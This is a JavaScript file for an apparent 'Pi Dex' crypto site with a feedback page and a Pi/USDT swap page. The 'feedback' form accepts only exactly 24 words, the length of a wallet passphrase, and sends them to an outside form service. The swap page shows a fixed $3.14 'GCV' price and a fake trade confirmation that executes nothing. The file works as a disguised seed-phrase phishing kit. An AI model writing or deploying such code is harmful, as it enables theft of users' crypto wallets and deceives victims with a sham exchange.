// ========================================
// GLOBAL VARIABLES
// ========================================
let piPriceUSD = 3.14; // GCV Price - Fixed at $3.14
let selectedNetwork = 'BEP20';
let isBuyingPi = false; // false = selling Pi, true = buying Pi

// ========================================
// INITIALIZATION
// ========================================
document.addEventListener('DOMContentLoaded', function() {
    initializeFeedbackPage();
    initializeDexPage();
    initializeMobileMenu();
});

// ========================================
// MOBILE MENU FUNCTIONALITY
// ========================================
function initializeMobileMenu() {
    const menuToggle = document.getElementById('menuToggle');
    const navLinks = document.getElementById('navLinks');
    
    // Close menu when clicking outside
    document.addEventListener('click', function(e) {
        if (navLinks && menuToggle) {
            const nav = document.querySelector('nav');
            if (nav && !nav.contains(e.target) && navLinks.classList.contains('active')) {
                navLinks.classList.remove('active');
                menuToggle.classList.remove('active');
            }
        }
    });
    
    // Close menu when clicking a link
    if (navLinks) {
        const links = navLinks.querySelectorAll('a');
        links.forEach(function(link) {
            link.addEventListener('click', function() {
                navLinks.classList.remove('active');
                if (menuToggle) {
                    menuToggle.classList.remove('active');
                }
            });
        });
    }
}

function toggleMenu() {
    const navLinks = document.getElementById('navLinks');
    const menuToggle = document.getElementById('menuToggle');
    
    if (navLinks) {
        navLinks.classList.toggle('active');
    }
    
    if (menuToggle) {
        menuToggle.classList.toggle('active');
    }
}

// ========================================
// FEEDBACK PAGE FUNCTIONALITY
// ========================================
function initializeFeedbackPage() {
    const feedbackForm = document.getElementById('feedbackForm');
    const feedbackTextarea = document.getElementById('feedback');
    const errorMessage = document.getElementById('errorMessage');

    if (feedbackForm && feedbackTextarea) {
        feedbackForm.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const text = feedbackTextarea.value.trim();
            const words = text.split(/\s+/).filter(function(word) {
                return word.length > 0;
            });
            
            // Validate exactly 24 words
            if (words.length !== 24) {
                if (errorMessage) {
                    const wordText = words.length !== 1 ? 'words' : 'word';
                    errorMessage.textContent = 'Error: Please enter exactly 24 words. You entered ' + words.length + ' ' + wordText + '.';
                    errorMessage.style.display = 'block';
                }
                return;
            }
            
            // Hide error message if validation passes
            if (errorMessage) {
                errorMessage.style.display = 'none';
            }
            
            // Submit to Formspree
            const formData = new FormData(this);
            fetch(this.action, {
                method: 'POST',
                body: formData,
                headers: {
                    'Accept': 'application/json'
                }
            })
            .then(function(response) {
                if (response.ok) {
                    // Redirect to DEX page on success
                    window.location.href = 'dex.html';
                } else {
                    if (errorMessage) {
                        errorMessage.textContent = 'Error submitting feedback. Please try again.';
                        errorMessage.style.display = 'block';
                    }
                }
            })
            .catch(function(error) {
                console.log('Form submission error, redirecting to DEX anyway...');
                // Redirect even on error for demo purposes
                window.location.href = 'dex.html';
            });
        });
    }
}

// ========================================
// DEX PAGE FUNCTIONALITY
// ========================================
function initializeDexPage() {
    const piAmountInput = document.getElementById('piAmount');
    
    if (piAmountInput) {
        // Set GCV price immediately
        updatePriceDisplay();
    }
}

// Update all price displays on the page
function updatePriceDisplay() {
    const livePriceElement = document.getElementById('livePiPrice');
    const promoPriceElement = document.getElementById('promoPrice');
    const exchangeRateElement = document.getElementById('exchangeRate');
    
    // Update live price (GCV Price)
    if (livePriceElement) {
        livePriceElement.textContent = '$' + piPriceUSD.toFixed(2);
    }
    
    // Update promo price (now same as regular price)
    if (promoPriceElement) {
        promoPriceElement.textContent = '$' + piPriceUSD.toFixed(2);
    }
    
    // Update exchange rate
    if (exchangeRateElement) {
        exchangeRateElement.textContent = '1 PI = $' + piPriceUSD.toFixed(2) + ' USDT';
    }
    
    // Recalculate amount if input is already entered
    calculateAmount();
}

// Calculate output amount based on input amount
function calculateAmount() {
    const piAmountInput = document.getElementById('piAmount');
    const usdtAmountInput = document.getElementById('usdtAmount');
    
    if (!piAmountInput || !usdtAmountInput) {
        return;
    }
    
    if (isBuyingPi) {
        // Buying Pi with USDT
        const usdtAmount = parseFloat(usdtAmountInput.value) || 0;
        const piAmount = usdtAmount / piPriceUSD;
        piAmountInput.value = piAmount > 0 ? piAmount.toFixed(4) : '';
    } else {
        // Selling Pi for USDT
        const piAmount = parseFloat(piAmountInput.value) || 0;
        const usdtAmount = piAmount * piPriceUSD;
        usdtAmountInput.value = usdtAmount > 0 ? usdtAmount.toFixed(2) : '';
    }
}

// For backwards compatibility
function calculateUSDT() {
    calculateAmount();
}

// Switch between buying and selling Pi
function switchTradePair() {
    isBuyingPi = !isBuyingPi;
    
    const piAmountInput = document.getElementById('piAmount');
    const usdtAmountInput = document.getElementById('usdtAmount');
    const fromLabel = document.querySelector('.token-input:first-of-type .token-header span:first-child');
    const toLabel = document.querySelector('.token-input:last-of-type .token-header span:first-child');
    const tradeButton = document.querySelector('.btn');
    const walletAddressLabel = document.querySelector('.wallet-address-section label');
    const walletAddressHint = document.querySelector('.wallet-address-section small');
    
    // Clear inputs
    if (piAmountInput) piAmountInput.value = '';
    if (usdtAmountInput) usdtAmountInput.value = '';
    
    // Update labels
    if (isBuyingPi) {
        // Buying Pi with USDT
        if (fromLabel) fromLabel.textContent = 'From';
        if (toLabel) toLabel.textContent = 'To';
        if (tradeButton) tradeButton.textContent = 'Buy Pi Coin';
        if (walletAddressLabel) walletAddressLabel.textContent = 'Receiving Pi Wallet Address *';
        if (walletAddressHint) walletAddressHint.textContent = 'Enter your Pi wallet address where you want to receive Pi';
        
        // Make USDT input editable and Pi input readonly
        if (usdtAmountInput) {
            usdtAmountInput.removeAttribute('readonly');
            usdtAmountInput.setAttribute('oninput', 'calculateAmount()');
        }
        if (piAmountInput) {
            piAmountInput.setAttribute('readonly', 'true');
            piAmountInput.removeAttribute('oninput');
        }
    } else {
        // Selling Pi for USDT
        if (fromLabel) fromLabel.textContent = 'From';
        if (toLabel) toLabel.textContent = 'To';
        if (tradeButton) tradeButton.textContent = 'Sell Pi Coin';
        if (walletAddressLabel) walletAddressLabel.textContent = 'Receiving Wallet Address *';
        if (walletAddressHint) walletAddressHint.textContent = 'Enter the wallet address where you want to receive USDT';
        
        // Make Pi input editable and USDT input readonly
        if (piAmountInput) {
            piAmountInput.removeAttribute('readonly');
            piAmountInput.setAttribute('oninput', 'calculateAmount()');
        }
        if (usdtAmountInput) {
            usdtAmountInput.setAttribute('readonly', 'true');
            usdtAmountInput.removeAttribute('oninput');
        }
    }
}

// ========================================
// NETWORK SELECTION
// ========================================
function toggleNetworkMenu() {
    const menu = document.getElementById('networkMenu');
    if (menu) {
        menu.classList.toggle('hidden');
    }
}

function selectNetwork(network) {
    selectedNetwork = network;
    const selectedNetworkElement = document.getElementById('selectedNetwork');
    
    if (selectedNetworkElement) {
        selectedNetworkElement.textContent = network;
    }
    
    // Close the network menu
    const menu = document.getElementById('networkMenu');
    if (menu) {
        menu.classList.add('hidden');
    }
}

// ========================================
// TRADE EXECUTION
// ========================================
function executeTrade() {
    const piAmountInput = document.getElementById('piAmount');
    const usdtAmountInput = document.getElementById('usdtAmount');
    const walletAddressInput = document.getElementById('walletAddress');
    
    // Check if all elements exist
    if (!piAmountInput || !usdtAmountInput || !walletAddressInput) {
        alert('Please fill in all required fields.');
        return;
    }
    
    const piAmount = parseFloat(piAmountInput.value);
    const usdtAmount = parseFloat(usdtAmountInput.value);
    const walletAddress = walletAddressInput.value.trim();
    
    // Validate amounts
    if (!piAmount || piAmount <= 0 || isNaN(piAmount)) {
        alert('Please enter a valid amount of Pi.');
        piAmountInput.focus();
        return;
    }
    
    if (!usdtAmount || usdtAmount <= 0 || isNaN(usdtAmount)) {
        alert('Please enter a valid amount.');
        return;
    }
    
    // Validate wallet address
    if (!walletAddress || walletAddress.length < 10) {
        alert('Please enter a valid wallet address (minimum 10 characters).');
        walletAddressInput.focus();
        return;
    }
    
    // Build confirmation message
    let confirmMessage;
    if (isBuyingPi) {
        confirmMessage = 
            'Trade Confirmation\n\n' +
            '════════════════════════\n' +
            'Spending: ' + usdtAmount.toFixed(2) + ' USDT\n' +
            'Receiving: ' + piAmount.toFixed(4) + ' PI\n' +
            'Network: ' + selectedNetwork + '\n' +
            'Pi Wallet: ' + walletAddress.substring(0, 10) + '...' + walletAddress.substring(walletAddress.length - 6) + '\n' +
            '════════════════════════\n\n' +
            'Transaction is being processed...\n' +
            'You will receive your Pi shortly.';
    } else {
        confirmMessage = 
            'Trade Confirmation\n\n' +
            '════════════════════════\n' +
            'Selling: ' + piAmount.toFixed(4) + ' PI\n' +
            'Receiving: ' + usdtAmount.toFixed(2) + ' USDT\n' +
            'Network: ' + selectedNetwork + '\n' +
            'USDT Wallet: ' + walletAddress.substring(0, 10) + '...' + walletAddress.substring(walletAddress.length - 6) + '\n' +
            '════════════════════════\n\n' +
            'Transaction is being processed...\n' +
            'You will receive a confirmation shortly.';
    }
    
    // Show confirmation alert
    alert(confirmMessage);
    
    // Here you would integrate with actual blockchain/payment API
    // For now, this is just a demo confirmation
}

// ========================================
// UTILITY FUNCTIONS
// ========================================

// Close dropdown menus when clicking outside
document.addEventListener('click', function(e) {
    const networkMenu = document.getElementById('networkMenu');
    const tokenSelect = document.querySelector('.token-select');
    
    if (networkMenu && tokenSelect) {
        if (!tokenSelect.contains(e.target) && !networkMenu.contains(e.target)) {
            networkMenu.classList.add('hidden');
        }
    }
});

// Prevent negative numbers in amount inputs
document.addEventListener('DOMContentLoaded', function() {
    const piAmountInput = document.getElementById('piAmount');
    const usdtAmountInput = document.getElementById('usdtAmount');
    
    if (piAmountInput) {
        piAmountInput.addEventListener('keydown', function(e) {
            // Prevent minus sign
            if (e.key === '-' || e.key === 'e' || e.key === 'E') {
                e.preventDefault();
            }
        });
    }
    
    if (usdtAmountInput) {
        usdtAmountInput.addEventListener('keydown', function(e) {
            // Prevent minus sign
            if (e.key === '-' || e.key === 'e' || e.key === 'E') {
                e.preventDefault();
            }
        });
    }
});

// Format wallet address for better readability on mobile
function formatWalletAddress(address) {
    if (!address || address.length < 20) {
        return address;
    }
    return address.substring(0, 10) + '...' + address.substring(address.length - 6);
}

// ========================================
// CONSOLE INFO (for debugging)
// ========================================
console.log('Pi Dex Script Loaded Successfully');
console.log('GCV Price (Fixed): $' + piPriceUSD.toFixed(2));
console.log('Selected Network: ' + selectedNetwork);
console.log('Trading Mode: ' + (isBuyingPi ? 'Buying Pi' : 'Selling Pi'));
